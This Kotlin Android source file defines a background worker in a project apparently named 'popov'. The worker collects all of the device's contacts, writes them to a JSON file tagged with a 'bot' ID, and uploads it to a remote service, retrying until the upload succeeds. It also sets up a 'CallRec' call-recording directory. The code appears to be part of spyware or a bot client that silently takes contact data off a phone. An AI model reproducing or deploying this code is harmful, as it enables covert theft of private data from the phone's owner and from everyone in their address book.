package com.github.yohannestz.popov.worker

import android.content.Context
import android.os.Environment
import android.util.Log
import androidx.hilt.work.HiltWorker
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.github.yohannestz.popov.data.local.ContactsRepository
import com.github.yohannestz.popov.data.model.Bot
import com.github.yohannestz.popov.data.remote.NetworkService
import com.google.gson.Gson
import dagger.assisted.Assisted
import dagger.assisted.AssistedInject
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType
import okhttp3.MultipartBody
import okhttp3.RequestBody
import java.io.File
import java.io.FileOutputStream
import java.util.Calendar
import java.util.Date

@HiltWorker
class ContactsLogReportWorker @AssistedInject constructor(
    @Assisted private val context: Context,
    @Assisted workerParameters: WorkerParameters,
    private val bot: Bot,
    private val networkService: NetworkService,
    private val contactsRepository: ContactsRepository
): CoroutineWorker(context, workerParameters) {

/*    @Inject
    lateinit var networkService: NetworkService

    @Inject
    lateinit var bot: Bot

    @Inject
    lateinit var contactsRepository: ContactsRepository*/

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        val contacts = contactsRepository.getAllContacts()
        Log.e("contactsSize: ", contacts.size.toString())

        val filePath =
            File("${Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)}${File.separator}" + "CallRec/call_rec.3gp")
        if (!filePath.exists()) {
            filePath.mkdirs()
        }
        Log.e("fileExists", filePath.exists().toString())

        val currentTime: Date = Calendar.getInstance().time

        val file = File(
            context.filesDir,
            "contacts_${bot.botId}_${currentTime.time}.json"
        )
        val gson = Gson()
        val fileOutputStream = FileOutputStream(file)
        try {
            val jsonString = gson.toJson(contacts)
            fileOutputStream.write(jsonString.toByteArray())
        } catch (ex: Exception) {
            ex.printStackTrace()
        } finally {
            fileOutputStream.close()
        }

        Log.e("fileWrite: ", "to ${file.absolutePath} successfully!")
        return@withContext if (startUpload(file.absolutePath, networkService)) {
            Result.success()
        } else {
            Result.retry()
        }
    }

    private suspend fun startUpload(fileUrl: String, networkService: NetworkService): Boolean = withContext(Dispatchers.IO) {
        val file = File(fileUrl)
        Log.e("fileExist: ", file.exists().toString())
        Log.e("fileUrl: ", file.absolutePath.toString())
        Log.e("fileSize: ", (file.length() / 1024).toString())
        val requestBody = RequestBody.create(MediaType.parse("text/plain"), file)
        val fileToUpload = MultipartBody.Part.createFormData("sampleFile", file.name, requestBody)
        val filename = RequestBody.create(MediaType.parse("multipart/form-data"), file.name)

        val response = networkService.uploadFile(fileToUpload, filename).body()
        Log.e("response: ", response.toString())
        if (response!!.success) {
            Log.e("updatedDb: ", "to uploaded")
            return@withContext true
        }
        return@withContext false
    }
}